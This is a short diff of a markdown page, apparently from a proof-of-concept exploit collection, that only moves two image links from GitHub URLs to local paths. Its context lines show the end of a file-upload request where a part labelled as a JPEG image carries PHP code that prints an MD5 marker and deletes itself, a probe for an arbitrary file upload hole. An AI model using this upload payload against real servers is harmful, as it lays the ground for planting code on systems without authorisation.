@@ -22,6 +22,6 @@ Content-Type: image/jpg
 <?php echo md5('666');unlink(__FILE__);?>
 ------WebKitFormBoundarydAPjrmyKewWuf59H--
 ```
-![cc46175e2bc4984a6dacff9ec6771b37](https://github.com/wy876/POC/assets/139549762/498ea42c-e9d2-4600-b03e-f59c4f7cfd8d)
+![cc46175e2bc4984a6dacff9ec6771b37](../../images/498ea42c-e9d2-4600-b03e-f59c4f7cfd8d.png)
 
-![38fb48542afcd1995688e8d030f32750](https://github.com/wy876/POC/assets/139549762/022df476-917d-4ed1-b877-3e2aff0d8611)
+![38fb48542afcd1995688e8d030f32750](../../images/022df476-917d-4ed1-b877-3e2aff0d8611.png)
